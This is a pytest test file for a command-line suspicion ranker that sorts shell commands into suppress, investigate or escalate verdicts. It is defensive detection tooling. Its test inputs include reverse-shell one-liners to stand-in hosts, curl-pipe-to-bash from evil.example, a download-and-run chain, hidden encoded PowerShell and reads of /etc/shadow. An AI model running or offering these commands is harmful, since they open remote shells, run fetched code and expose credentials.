"""Tests for the command-line suspicion lexicon ranker."""
from __future__ import annotations

from shallots.ai.lexicon_ranker import LexiconRanker


R = LexiconRanker()


def test_benign_commands_score_low_and_suppress():
    for cmd in (
        "/usr/bin/ls -la /home/user",
        "git status",
        "systemctl restart nginx",
        "apt-get update",
        "python3 /opt/myapp/worker.py --loop",
        "grep -r TODO src/",
    ):
        res = R.score(cmd)
        assert R.verdict(res) == "suppress", f"{cmd!r} scored {res.score}"


def test_reverse_shell_escalates_alone():
    for cmd in (
        "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
        "nc -e /bin/sh 203.0.113.9 4444",
        "socat tcp-connect:evil.example:443 exec:/bin/sh,pty,stderr",
    ):
        res = R.score(cmd)
        assert R.verdict(res) == "escalate", f"{cmd!r} scored {res.score} tags={res.tags}"
        assert "reverse_shell" in res.tags


def test_download_and_execute_escalates():
    res = R.score("curl -s http://evil.example/x.sh | bash")
    assert R.verdict(res) == "escalate"
    assert "download_exec" in res.tags


def test_encoded_powershell_escalates():
    res = R.score("powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAt...")
    assert R.verdict(res) == "escalate"


def test_credential_dump_escalates():
    assert R.verdict(R.score("cat /etc/shadow")) in ("escalate", "investigate")
    assert R.verdict(R.score("getent shadow")) in ("escalate", "investigate")


def test_lone_discovery_is_soft_not_escalated():
    # a single whoami is background noise, not an incident
    res = R.score("whoami")
    assert R.verdict(res) == "suppress"


def test_stacked_discovery_becomes_investigate():
    # recon chain in one line stacks up
    res = R.score("whoami; id; uname -a; ss -tnlp; cat /etc/passwd")
    assert res.score >= R.investigate_threshold


def test_cross_tactic_chain_gets_bonus():
    plain = R.score("curl -o /tmp/x http://evil/x")           # download only
    chain = R.score("curl -o /tmp/x http://evil/x && chmod +x /tmp/x && /tmp/x")
    assert chain.score > plain.score
    assert len(chain.tags) >= 2


def test_context_multiplier_shell_from_webserver():
    cmd = "sh -c id"
    base = R.score(cmd)
    ctx = R.score(cmd, context={"parent_comm": "nginx"})
    assert ctx.score >= base.score


def test_writable_path_execution_bumps_score():
    res = R.score("/tmp/.hidden", context={"writable_path": True, "first_seen": True})
    assert res.score > 0


def test_top_reason_is_human_readable():
    res = R.score("nc -e /bin/sh 1.2.3.4 9001")
    assert res.top_reason
    assert isinstance(res.top_reason, str)


def test_from_file_falls_back_when_missing():
    r = LexiconRanker.from_file("/nonexistent/lexicon.json")
    assert R.verdict(r.score("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")) == "escalate"
